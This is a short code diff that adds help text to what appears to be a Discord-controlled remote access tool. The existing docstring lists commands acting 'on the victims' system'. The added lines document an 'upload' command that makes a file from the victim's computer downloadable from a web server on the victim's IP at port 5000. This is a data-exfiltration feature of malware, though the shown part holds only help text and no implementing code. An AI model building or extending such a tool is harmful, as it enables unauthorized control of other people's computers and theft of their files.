@@ -259,6 +259,7 @@ async def on_ready():
     "hard-shutdown" = Terminates all scripts completly
     "create-exe" = Creates an executable file and stores in in a file
     "create-clone" = creates a clone of the repository and stores it locally on the victims' system
+    "upload <file>" = This will upload a file to the server that the victim computer hosts, so you can download the file
     
     -----------------------------------------------------------------------------------------------------
     Examples:
@@ -274,6 +275,10 @@ async def on_ready():
     ---
     "echo "Hello World" > hello.txt" 
     This creates a file called "hello.txt" in the current directory with the text "Hello World"
+    ---
+    "upload textDoc.txt"
+    This uploads the document "textDoc.txt" to the web server with the url "http://<victim's IP>:5000"
+    Lets say the victims IP is "1.2.3.4", the url would be "http://1.2.3.4:5000"
 """
 
 
